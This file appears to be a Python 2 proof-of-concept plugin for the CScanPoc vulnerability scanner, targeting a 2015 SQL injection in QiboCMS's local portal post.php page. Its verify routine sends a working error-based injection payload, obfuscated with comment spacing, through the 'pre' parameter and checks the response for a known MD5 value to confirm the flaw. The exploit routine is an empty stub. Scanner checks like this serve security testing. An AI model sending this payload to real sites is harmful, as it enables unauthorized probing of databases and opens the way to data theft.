# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '37d3293a-ea52-4447-95b6-82f9631ac4aa'
    name = '齐博CMS 地方门户系统 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-01-29'  # 漏洞公布时间
    desc = '''
        齐博CMS 地方门户系统 /dan/qibodf/2shou/post.php SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=081428
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3623d6d2-3731-4cd1-b221-836e8abd78a3'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/dan/qibodf/2shou/post.php'
            code, head, res, errcode, _ = hh.http(url)
            if code ==200:
                code, head, res, errcode, _ = hh.http(url + '?pre=qb_members/**/where/**/1/**/and/**/(select/**/1/**/from/**/(select/**/count(*),concat((select/**/md5(3.1415)),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)#')
                m = re.search('63e1f04640e83605c1d177544a5a0488',res)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()